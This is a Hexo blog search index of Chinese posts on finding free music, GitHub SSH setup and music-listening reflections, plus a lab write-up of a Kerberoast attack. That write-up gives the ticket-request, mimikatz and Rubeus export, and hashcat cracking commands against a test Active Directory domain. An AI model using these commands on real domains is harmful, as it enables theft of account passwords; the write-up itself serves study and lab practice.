<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>听歌的姿势一定要正确01</title>
    <link href="/posts/20230530-2db8aa1.html"/>
    <url>/posts/20230530-2db8aa1.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="👀前言"><a href="#👀前言" class="headerlink" title="👀前言"></a>👀前言</h2><p>欣赏音乐的途径有很多，但是如何找到自己想要的欣赏的歌曲呢？国内的各大音乐平台，因为歌曲版权啊或者其他原因，不可能让我们在一个平台可以把想听的歌曲全部听到，这样折腾于各大平台的烦恼，可能大多数人都会有把。我就我找歌的经验，来谈一谈搜寻歌曲的“方法论”。</p><p>本文讨论的主题主要是“如何找到我们要听的歌曲”，区别于“如何找到我们喜欢的歌曲”，区别于“我如何去播放歌曲”，这都是“欣赏音乐”的不同姿势，至于如何“白嫖”我们喜欢的音乐，我也会在本文讨论，但是要说明的是，如果你真的喜欢某首歌，请支持他。有比必要说明作者可是在网易云开通了黑胶VIP的，我可不是“白嫖怪”😜😜😜</p><p>thene:<strong>如何找到我们要听的歌曲和白嫖ta？</strong></p><h2 id="📌移动端"><a href="#📌移动端" class="headerlink" title="📌移动端"></a>📌移动端</h2><h3 id="✨姿势01：平台"><a href="#✨姿势01：平台" class="headerlink" title="✨姿势01：平台"></a>✨姿势01：平台</h3><p>很经典的一个方法，A音乐软件搜不到，到B音乐软件搜索，B音乐软件有，但是收费，到C短视频平台搜索。</p><ul><li>优点：免费</li><li>缺点：不方便听歌</li></ul><p>我喜欢的短视频平台是哔哩哔哩，也就是B站，而且B站还有<strong>听视频</strong>的功能，可以算是一个另类的播放器了。聚合各大音乐平台的音乐的UP主有很多，这里推荐两个：</p><ul><li><a href="https://space.bilibili.com/229733301">音乐私藏馆</a></li><li><a href="https://space.bilibili.com/279180568">零距离音乐</a></li></ul><h3 id="✨姿势02：个人搭建的音乐搜索-amp-分享网站"><a href="#✨姿势02：个人搭建的音乐搜索-amp-分享网站" class="headerlink" title="✨姿势02：个人搭建的音乐搜索&amp;分享网站"></a>✨姿势02：个人搭建的音乐搜索&amp;分享网站</h3><ul><li>优点：免费</li><li>缺点：不稳定，随时可能失效</li></ul><p>这里推荐两个：</p><ul><li><a href="https://music.liuzhijin.cn/">刘志进实验室</a></li><li><a href="https://tools.liumingye.cn/music/#/">音乐分享liumingye</a></li></ul><h3 id="✨姿势03：第三方音乐搜索下载软件"><a href="#✨姿势03：第三方音乐搜索下载软件" class="headerlink" title="✨姿势03：第三方音乐搜索下载软件"></a>✨姿势03：第三方音乐搜索下载软件</h3><p>☘ <a href="https://lxmusic.toside.cn/">洛雪音乐</a></p><ul><li>免费无广告</li><li>多端支持</li><li>开源</li></ul><h3 id="✨姿势04：无损音乐下载站"><a href="#✨姿势04：无损音乐下载站" class="headerlink" title="✨姿势04：无损音乐下载站"></a>✨姿势04：无损音乐下载站</h3><p>百度一下<strong>无损音乐下载</strong>，一大把的无损音乐下载网站，我们可以搜一下想找的歌，没有搜索到也不打紧，多试试不同的下载站，可能有惊喜。</p><h3 id="✨姿势05：国外平台-amp-软件"><a href="#✨姿势05：国外平台-amp-软件" class="headerlink" title="✨姿势05：国外平台&amp;软件"></a>✨姿势05：国外平台&amp;软件</h3><p>这个真没啥说的，只要你会，基本解决90%的找不到歌的问题，这里推荐一个国外的移动端安卓音乐软件，聚合的音乐资源来自油管，提供多种音乐格式下载，提供谷歌登陆方式，当然，国内方IP无法访问。</p><ul><li><a href="https://ymusic.io/">YMusic</a></li></ul><p>​Super convenient music app for you, enjoy music from YouTube with smallest consumed data! </p><h3 id="✨姿势06：一个朋友"><a href="#✨姿势06：一个朋友" class="headerlink" title="✨姿势06：一个朋友"></a>✨姿势06：一个朋友</h3><p>如果你有一个超级会找资源的朋友，干嘛要自己动手呢😂😂</p><hr><h2 id="📌PC端"><a href="#📌PC端" class="headerlink" title="📌PC端"></a>📌PC端</h2><p>电脑和移动端的方法大同小异，比如你可以安卓国产音乐软件，比如可以在浏览器输入<strong>bilibili.com</strong>，也可以在浏览器搜索<strong>音乐</strong>[滑稽.jpg]</p><p>那就说说不一样的吧</p><h3 id="✨姿势01"><a href="#✨姿势01" class="headerlink" title="✨姿势01"></a>✨姿势01</h3><ul><li><a href="https://lxmusic.toside.cn/">洛雪音乐</a></li></ul><p>安装洛雪音乐这种开源无广告的聚合搜索软件，配置费点心思，使用体验超过很多国产软件。</p><h3 id="✨姿势02"><a href="#✨姿势02" class="headerlink" title="✨姿势02"></a>✨姿势02</h3><ul><li><a href="https://music.liuzhijin.cn/">刘志进实验室</a></li><li><a href="https://tools.liumingye.cn/music/#/">音乐分享liumingye</a></li></ul><p>使用以上这种音乐站来搜索你想找的歌，同时也可以听歌，不需要安装额外的软件，只需要收藏一下音乐网址。</p><h3 id="✨姿势03"><a href="#✨姿势03" class="headerlink" title="✨姿势03"></a>✨姿势03</h3><p>安装浏览器插件，这里推荐一个浏览器插件Listen 1</p><p>官方网站：<a href="https://listen1.github.io/listen1/">https://listen1.github.io/listen1/</a></p><p>github: <a href="https://github.com/listen1">https://github.com/listen1</a></p><p>使用方法在下载界面就可以看到，同时，你在网页登陆了网易云音乐，Listen 1上可以看到你的歌单，很方便。</p><p>Listen 1也是聚合搜索，可以从国内各大音乐平台搜索你想要的歌，基本解决95%的问题。</p><hr><h2 id="📌结语："><a href="#📌结语：" class="headerlink" title="📌结语："></a>📌结语：</h2><p>通过以上的方式，基本你想听的歌都可以找到，可能有些歌因为版权原因不能搜索到，不能试听，这很正常，想要免费听歌，我也可以给以下建议：</p><ul><li>使用朋友的音乐会员</li><li>在互联网上搜索音乐资源，下载音乐资源，如百度网盘，阿里网盘</li><li>在短视频平台搜索自己想要听的歌</li><li>在国外的音乐、视频平台搜索想听的歌</li></ul><p>最后，我想说，不听付费音乐就是最合理的免费，可能会省你的钱，可能会省你的时间……</p><hr><p>以上的找歌方法我基本想听的歌都能找到，一些小众的、某些翻唱搜不到就需要自己多花点时间和心思了，希望这篇文章可以帮助到有需要的人吧。</p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kerberoast攻击分析</title>
    <link href="/posts/20230529-b244341.html"/>
    <url>/posts/20230529-b244341.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我将使用chatGPT在前言对一些基础性知识进行解释。</p><p>需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。</p><h3 id="什么是Kerberoast攻击"><a href="#什么是Kerberoast攻击" class="headerlink" title="什么是Kerberoast攻击"></a>什么是Kerberoast攻击</h3><blockquote><p>Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用户身份验证和授权。在 Kerberos 协议中，用户会向 Kerberos 服务器请求一个安全令牌（ticket），用于在 Windows 域环境中访问资源。</p><p>Kerberoast 攻击利用了 Kerberos 协议中的漏洞，通过获取 Kerberos 中的服务票据（Service Ticket），并对其进行离线攻击，从而获取到目标用户的明文密码。攻击者可以利用 Kerberoast 攻击来在不知道用户密码的情况下获取到用户的密码哈希值，然后使用密码破解工具对其进行破解，最终获取到用户的明文密码。由于攻击者可以在离线环境中进行攻击，因此 Kerberoast 攻击可以避免被 Kerberos 协议的防护机制所检测到。</p></blockquote><h3 id="什么是SPN"><a href="#什么是SPN" class="headerlink" title="什么是SPN"></a>什么是SPN</h3><blockquote><p>SPN（Service Principal Name）是指服务主体名称，是 Kerberos 身份验证协议中用于标识服务实例的唯一标识符。SPN 通常由服务名称和主机名组成，用于标识服务在网络上的唯一实例，帮助 Kerberos 协议正确地将服务票据（Service Ticket）授予给服务实例。</p><p>在 Windows 域环境中，SPN 是非常重要的，因为 Kerberos 身份验证协议是 Windows 域环境中最常用的身份验证协议。如果 SPN 配置不正确，可能会导致 Kerberos 身份验证协议无法正常工作，从而影响到整个域环境的安全和稳定性。</p></blockquote><h4 id="SPN的类型"><a href="#SPN的类型" class="headerlink" title="SPN的类型"></a>SPN的类型</h4><ul><li>一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。</li><li>另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</li></ul><p>域环境下执行命令：<code>setspn -q */*</code>查看当前域内所有SPN，SPN分类如下：</p><p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p><p>域控制器：CN=DC,OU=Domain Controllers,DC=laosec,DC=cn</p><p>域用户帐户：CN=krbtgt,CN=Users,DC=laosec,DC=cn</p><p>机器帐户：CN=WIN7,CN=Computers,DC=laosec,DC=cn</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h3><p>从内存中提取明文密码、散列、PIN 码和 kerberos 票据现在已广为人知。**<code>mimikatz</code>**还可以执行 pass-the-hash、pass-the-ticket 或 build <em>Golden tickets</em>。</p><h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></h3><p>Rubeus是一个 C# 工具集，是可以针对Kerberos协议进行攻击的工具,可以发起Kerberos请求,并将请求票据导入内存中,Rebeus提供了大量的用于Kerberos攻击的功能,比如TGT请求/ST请求/AS-REP Roasting攻击/Kerberoasting攻击/委派攻击/黄金票据/白银票据等。</p><h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><a href="https://github.com/hashcat/hashcat">Hashcat</a></h3><p>hashcat工具的简介与使用可以参考：<a href="https://goyasha.com/post/ZKgJ5d4Q/">本文</a></p><hr><p>工具的简介与使用互联网解释的比我好，上面工具罗列了他们的github地址，请参考</p><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p>域控：Windows service 2016</p><p>​同时安装SQL Server 2008 R2 </p><p>​同时创建用户mssql，密码sky@1321</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn -A MSSQLSvc/demo<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">1443</span> mssql<br></code></pre></td></tr></tbody></table></figure><p>注册一条服务类为MSSQLSvc，主机为demo.test.com，端口为1433，注册在mssql域用户下</p><figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">setspn -q <span class="hljs-strong">*/*</span><br></code></pre></td></tr></tbody></table></figure><p>查看当前所有域</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br><span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/demo.test.com:1443"<br></code></pre></td></tr></tbody></table></figure><p>请求SPNKerberos票据——单个服务</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png" alt="image-20230529125706148"></p><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">klist</span><br></code></pre></td></tr></tbody></table></figure><p>查看缓存中的所有票据</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png" alt="image-20230529125851635"></p><p>使用Rubeus和mimikatz都可以导出票据</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list /<span class="hljs-keyword">export</span><span class="hljs-comment">//mimikatz执行</span><br>Rubeus.exe kerberoast /outfile:hash.txt<br></code></pre></td></tr></tbody></table></figure><p>mimikatz:kerberos::list /export</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2.<span class="hljs-number">7</span> tgsrepcrack<span class="hljs-selector-class">.py</span> zidian<span class="hljs-selector-class">.txt</span> ex.kirbi<br></code></pre></td></tr></tbody></table></figure><p>在kali安装kerberoast，使用kerberoast的tgsrepcrack.py离线破解票据ex.kirbi</p><p>rubeus:<img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png" alt="image-20230529130759981"></p><p>因为hashcat的运行模式，在虚拟机破解报错，我们在真机运行以下命令，尝试破解</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">13100</span> hash<span class="hljs-selector-class">.txt</span> ziidian.txt<br></code></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png" alt="image-20230529131206163"></p><p>成功，可以看到密码sky@1321</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注册主机名要和后面请求票据时保持一致。</p><p>demo是主机名，test.com是域控网址。</p><p>zidian.txt是包含密码的字典，可能不包含你设置账户的密码，可以自行添加</p><p>-m 13100是破解的模式，可以这篇<a href="https://goyasha.com/post/ZKgJ5d4Q/">文章</a>选择</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>做人就是要要要要听歌！</title>
    <link href="/posts/20230528-1f757a4a.html"/>
    <url>/posts/20230528-1f757a4a.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>音乐是一种艺术形式，通过声音的有序排列组合来表达情感、想法或意义。音乐通常包括旋律、节奏、和声和歌词等元素，并用不同的乐器、歌唱和其他声音效果进行演奏或表演。</p></blockquote><h3 id="爱厌"><a href="#爱厌" class="headerlink" title="爱厌"></a>爱厌</h3><p>很小很小就和音乐结缘，穷人家孩子，没什么艺术熏陶，在我的认知里，音乐就是听歌，对音乐的鉴赏也止步于….唔，就是好听和不好听。</p><p>规则很简单，但很好用。</p><p>从此我听歌，只听歌。不因为某个歌手的某首歌好听，而偏爱该歌手的其它歌曲，仅仅只是会增加自己尝试试听该歌手的其它歌曲的可能。</p><p>每首歌的”歌生”也是充满了变数，因为我评判好听的标准十分不公平，完全取决于自己某一时刻的主观感受。经常会发生这样的事，在B站听到某首歌好听，去网易云一搜索，提示我将该歌曲已经加入了黑名单，冤枉啊！因为我喜欢用网易云的”私人FM”来尝试新歌，某些欢快些的歌可能就在我心情差的时候直接被拉黑了。虽然“冤案”时有发生，但是对大多数歌来说，它们是幸运的，因为我不会因为其他因素，来评价它们。它的创作者、演唱者有什么生活作风问题，我不会关心，也不会因此对它有什么看法。就像是今天早上买早餐时买了一个卤蛋，味道格外的好，超级好吃，但是我可能不会去关心下这个蛋的母鸡，是被饲养还是放养。</p><p>小众的，欧美的，国风的，越南的，非主流的，我觉得喜欢的歌我都听，A演唱的某首歌不好听，B唱这首歌我觉得好听，我也听，音乐在我的世界，作用很简单，也很重要，音乐，或者说的更准确一点，听歌已经成为我生活中和吃饭一样普通的事情了。</p><p>如果用一句话来形容我对听歌的需要，那就是：今天可以不吃早饭，但是必须吃午饭。</p><hr><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><p>我对音乐也有自己的见解，这很显然，十几年如一日的事情做多了，谁没点自我的见解呢。</p><p>听歌啊，我觉得呢，有昨天，今天，明天的作用：</p><h4 id="昨天"><a href="#昨天" class="headerlink" title="昨天"></a>昨天</h4><p>什么是昨天呢，那就是音乐可以承载记忆，也可以说是唤起自己对昨天的记忆，昨天，也就是曾经过去的日子。</p><p>“我有勇气我都不怕，管他寒冬炎夏……”，我想起那个趴在凳子上看着动画片的小学生。</p><p>“想问天你在哪里，我想问问我自己……”，我想起侧躺在床上半夜听歌看小说的初中生。</p><p>现在重新听到某些歌，感受呢，就像是小时候想吃糖，大人又不给多吃，就用白糖兑开水给我喝，就是那种一壶水才放了一勺糖的比例，和开水没啥区别，但是又有甜味….很淡很淡的甜，很温馨很温馨的甜。</p><p>或许我已经不再喜欢听曾经喜欢听的某首歌，但是也会耐心的听完。</p><h4 id="现在"><a href="#现在" class="headerlink" title="现在"></a>现在</h4><p>什么是现在呢？如果让我来说，现在就是在码代码，等车，晚间散步……，现在就是我每天可能会听歌的时间，这个时候，我可能会用网易云的私人FM来尝试新歌，切到不喜欢的歌就丢到垃圾桶里，让网易云不要再推过我，当然也又可能无脑循环某一首歌，比如我现在在码这篇文章的时候，就在无脑循环<a href="https://space.bilibili.com/651386960">浅影阿_</a>唱的“不怕”，她的声音很好听，我很喜欢白嫖，不投币就是听🤣🤣🤣</p><p>现在听的音乐呢，也会有一些“因地制宜”，我在码字的时候听歌，就不喜欢太吵的音乐，有时候会听纯音乐，反正就是反正了。</p><h4 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h4><p>最后是未来，什么是未来呢，未来就是最适合听歌的时候，什么是最适合听歌的时候呢，那就是躺在床上，什么都不做，只戴耳机听歌的，夜深人静的夜晚和万籁俱寂的清晨，当然，这个时候也不能听太吵的歌，耳机声音也一定要小，耳机不好还可能会漏音，也需要注意吵到别人。</p><p>这个时候听歌，如果觉得无聊的话，晚上就想今天做了什么，晚上就是今天早上的未来嘛，好的坏的都往没的想，不然一会儿就会失眠捏<del>(￣▽￣)</del>*，早上嘛，当然就可以想今天可以做什么，往有的了想，想做了就起床，如果你不能在别人和闹钟响起之前醒来，肯定体验不到这种感觉了。</p><p>在未来听歌，最适合的做法就是什么都不要想，跟着歌的旋律，节奏，感受歌曲的声音，也不要去记歌词，不要跟着歌词走，就会感觉到放松，愉悦，感觉合适了就不听了。无论是一个可以熬夜的晚上还是可以赖床的早晨，都不要一直听歌，听久了会累。没有喜欢的或者说是适合的歌，躺着就不要动，不动当然就不能切歌，就有可以听的歌了。</p><hr><p>###结语<br>不知不觉，就写了两个小时了，文字可能不多，但都是一点一点，一边想一边写的，本来该睡午觉的，写着写着忘了，现在有点头大，老了，再也没有曾经高中晚上12点睡，早上6点起床，整天生龙活虎的精力了。</p><p>对听歌本人真的有一种特别的，独立的，独特的情感，我在开心的时候听歌，在不开心的时候听歌，在闲暇的时候听歌，在高中的晚自习偷偷听歌，在一个清爽的夏天拿大人手机听歌…….</p><p>听歌的过程就像是和最好的一个朋友说话，聊天，谈心，他无话不说，我永远沉默，他乐此不疲，我乐此不彼。</p><p>他说他喜欢我，哈哈哈，我可不是男同捏，伴随着自己莫名其妙的念头，自己会莫名其妙的姨母笑。</p><p>烦恼，焦虑，压力，我是谁，全忘了，只有思绪在脑海里，世界里，宇宙中，飘飞翻滚，来，去，我以此为食。</p>]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一台电脑SSH连接多个github账户的配置细节</title>
    <link href="/posts/20230526-155c2f89.html"/>
    <url>/posts/20230526-155c2f89.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作者在已经使用默认私钥连接某个github账户后，现在需要在另一个github账户上搭建Hexo博客，那么就需要配置两个私钥，下面就是配置过程的一些细节。</p><h3 id="配置SSH密钥："><a href="#配置SSH密钥：" class="headerlink" title="配置SSH密钥："></a>配置SSH密钥：</h3><p>只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步，在你第一次新建的文件夹里面（如：我的文件夹为：F:\Hnkey\Blog），右键Git Bash Here 输入以下命令：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ ssh-keygen -t rsa -C <span class="hljs-string">"your email@example.com"</span> <br><span class="hljs-regexp">//</span>引号里面填写你的邮箱地址，比如abcdefg@qq.com<br></code></pre></td></tr></tbody></table></figure><p>然后会出现以下信息：</p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Generating <span class="hljs-keyword">public</span>/<span class="hljs-keyword">private</span> rsa key pair.  <br>Enter <span class="hljs-keyword">file</span> in which to save the key (<span class="hljs-regexp">/c/U</span>sers<span class="hljs-regexp">/you/</span>.ssh/id_rsa):  <br></code></pre></td></tr></tbody></table></figure><p>不要以默认方式存储密钥，这样会覆盖我们以前的密钥：</p><p>选择一个合适的密钥名字，如：id_rsa_hnkey,然后就可以一直回车了，现在我们到C盘的.SSH文件里查看，就会有我们原来默认的私钥和新创建的私钥文件,文件列表如下：</p><figure class="highlight autohotkey"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">id_rsa<br>id_rsa.pub<br>id_rs<span class="hljs-built_in">a_hnkey</span><br>id_rs<span class="hljs-built_in">a_hnkey</span>.pub<br></code></pre></td></tr></tbody></table></figure><p>我们现在需要在该目录(我的.ssh目录：C:\Users\book.ssh)下新创建一个配置文件，文件名为config,没有后缀名，config文件编辑以下内容：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 加上以下内容</span><br><span class="hljs-comment">#default github</span><br>Host github.com<br>HostName github.com<br>PreferredAuthentications publickey<br>IdentityFile ~<span class="hljs-regexp">/.ssh/i</span>d_rsa<br> <br>Host hnkey.github.com<span class="hljs-comment">#取一个区别与默认Host(github.com)的别名，任意取，建议别名方便记忆</span><br>HostName github.com<span class="hljs-comment">#不要改这行</span><br>PreferredAuthentications publickey<br>IdentityFile ~<span class="hljs-regexp">/.ssh/i</span>d_rsa_hnkey<span class="hljs-comment">#私钥文件名</span><br>user hnkey<span class="hljs-comment">#指明是谁在使用改私钥</span><br></code></pre></td></tr></tbody></table></figure><p>由于第一个私钥是默认的，如果你也有一个默认的私钥，那么可以不做修改，主要需要对第二个私钥进行配置，细节在上文已经注释</p><p>修改完成后，测试一下链接是否成功建立</p><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -T git<span class="hljs-variable">@hnkey</span>.github.com<br></code></pre></td></tr></tbody></table></figure><p>区别于默认的测试命令</p><p>如果出现错误： Permission denied (publickey).</p><p>那么执行一下以下命令：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh-agent -s<br>ssh-add ~<span class="hljs-regexp">/.ssh/i</span>d_rsa_hnkey<span class="hljs-comment">#私钥文件名需要修改</span><br></code></pre></td></tr></tbody></table></figure><p>再执行测试命令，一般都不会出错，会出现以下提示：</p><figure class="highlight 1c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Hi,xxxxx, You<span class="hljs-string">"ve successfully......</span><br></code></pre></td></tr></tbody></table></figure><p>说明同一设备连接多github账户已经成功</p><h3 id="配置GIT个人信息"><a href="#配置GIT个人信息" class="headerlink" title="配置GIT个人信息"></a>配置GIT个人信息</h3><p>如果你在曾经连接GitHub仓库已经配置了全局的个人信息，不用清除，因为我得到的答案是局部配置会优于全局配置生效，那么，我们只需要在该仓库下配置局部的个人信息，就可以了。</p><p>为确保这是一个合格的git仓库，请在该仓库的起始目录初始化：</p><figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">git <span class="hljs-keyword">init</span><br></code></pre></td></tr></tbody></table></figure><p>然后执行以下命令，配置局部的git个人信息：</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git config <span class="hljs-keyword">user</span>.name "your.name"#需要配置的用户名和邮箱，这里的your.name,就输入前面config文件中的<span class="hljs-keyword">user</span>用户<br>git config <span class="hljs-keyword">user</span>.email "your.email"<br></code></pre></td></tr></tbody></table></figure><p>以后，我们在该仓库下执行克隆等命令，都需要使用别名</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git clone git@hnkey<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.com</span>:Hooahhh/hexo-theme-fluid<span class="hljs-selector-class">.git</span><br>官网给你的SSH连接地址是：github<span class="hljs-selector-class">.com</span>:Hooahhh/hexo-theme-fluid.git，需要手动修改<br></code></pre></td></tr></tbody></table></figure><h3 id="配置配置文件"><a href="#配置配置文件" class="headerlink" title="配置配置文件"></a>配置配置文件</h3><p>这一步是配置Hexo的配置文件的内容，与上文已无关系，在此做个记录。</p><p>Hexo文件下的_config.yml文件就是Hexo主要的配置文件，要想将内容配置到对应的仓库，配置文件修改如下：</p><figure class="highlight dts"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repository:</span> git@hnkey.github.com:Hnkey/hnkey.github.io.git<br><span class="hljs-symbol">  branch:</span> master<br>  <span class="hljs-meta">#需要注意的是，比如type: git之间有个空格</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/posts/20230526-4a17b156.html"/>
    <url>/posts/20230526-4a17b156.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span><br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></tbody></table></figure><p>More info: <a 